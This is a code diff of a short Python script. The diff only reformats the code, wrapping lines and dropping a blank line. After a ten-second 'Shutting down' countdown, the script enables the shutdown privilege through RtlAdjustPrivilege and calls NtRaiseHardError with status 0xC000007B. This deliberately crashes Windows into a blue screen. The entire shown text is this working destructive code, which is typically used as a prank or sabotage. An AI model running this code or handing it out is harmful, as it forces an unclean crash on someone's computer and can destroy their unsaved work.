@@ -21,14 +21,13 @@ for zaky in range(10):
     print("Shutting down in: " + str(10 - zaky) + " Seconds")
     time.sleep(1)
 
-
 print("Shutting down now!")
 time.sleep(0.5)
 
 nullptr = POINTER(c_int)()
 
-windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0), byref(c_int()))
+windll.ntdll.RtlAdjustPrivilege(c_uint(19), c_uint(1), c_uint(0),
+                                byref(c_int()))
 
-windll.ntdll.NtRaiseHardError(
-    c_ulong(0xC000007B), c_ulong(0), nullptr, nullptr, c_uint(6), byref(c_uint())
-)
+windll.ntdll.NtRaiseHardError(c_ulong(0xC000007B), c_ulong(0), nullptr,
+                              nullptr, c_uint(6), byref(c_uint()))
